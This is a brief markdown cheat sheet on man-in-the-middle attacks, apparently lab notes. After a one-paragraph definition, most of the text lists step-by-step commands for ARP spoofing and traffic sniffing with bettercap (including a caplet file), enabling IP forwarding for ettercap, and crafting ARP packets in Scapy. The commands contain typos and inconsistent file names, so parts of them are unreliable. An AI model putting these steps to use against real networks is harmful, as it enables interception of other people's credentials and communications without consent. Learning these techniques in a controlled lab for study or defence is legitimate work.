# Man In The Middle Attack

A man-in-the-middle (MITM) attack is a type of cyber attack where an attacker intercepts communication
between two parties without their knowledge. The attacker can eavesdrop on the communication, modify the
data being transmitted, or even impersonate one of the parties involved. This attack can be used to steal
sensitive information, such as login credentials or financial data. It is important to implement security
measures, such as encryption and certificate validation, to protect against MITM attacks.

- bettercap
- sudo su
- apt-get install bettercap
- bettercap >
- help
- help net.probe
- net.probe on
- help arp.spoof
- et arp.spoof.fullduplex true
- set arp.spoof.targets (ip)
- help net.sniff
- set net.sniff.local true
- arp.spoof on
- net.sniff on
- exit

- nano sniff.cat
- net.probe on
- set arp.spoof.fullduplex true
- set arp.spoof.targets (ip)
- set net.sniff.local true
- arp.spoof on
- net.sniff on

- bettercap -iface eth0 -caplet sniff.cap

### ettercap

- sudo su
- cat /proc/sys/net/ipv4/ip_forward
- echo 1 > /proc/sys/net/ipv4/ip_forward
- apt-get install ettercap
- ettercap -G
- exit
- arp -a

### Manually Poisoning Target ARP -> Scapy

- Scapy >
- ls(ether)
- ls(arp)
- ls(tcp)
- broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
- broadcast.show()
- arp_layer = ARP(pdst="target_ip")
- arp_layer.show()
- entire_packet = broadcast/arp_layer
- entire_packet.show()
- srp(entire_packet, timeout=2, verbose=true)[0]
- follow tutorial
